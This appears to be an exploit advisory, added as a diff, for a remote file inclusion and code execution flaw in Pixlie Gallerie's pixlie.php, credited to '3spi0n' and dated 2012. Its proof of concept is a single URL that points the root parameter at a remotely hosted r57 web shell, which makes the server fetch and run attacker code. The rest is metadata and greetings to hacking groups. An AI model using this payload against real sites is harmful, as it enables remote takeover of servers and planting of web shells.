@@ -1,0 +1,23 @@
+# Exploit Title; Pixlie Gallerie RFI Vulnerability [pixlie.php]
+# Date ; 14/04/12
+# Author ; 3spi0n
+# Script Vendor or Software Link ; www.pixlie.de
+# Category ; Webapps
+# Type ; RFI / RCE
+# Tested on ; Ubuntu / Win7
+
+[#] Vulnerable Details ;
+
+- RFI / RCE
+
+Vulnerable File ; pixlie.php
+
+[#] PoC
+ http://SERVER/pixlie.php?root=http://www.shellz.com/r57.txt?
+
+
+[#] Greetz ;
+
+- Grayhatz Corporation, www.Grayhatz.Co
+- My Official Blog, www.Ryuzaki.in
+- Facebook.Com/3spi0ne - Twitter.Com/RigidusCO
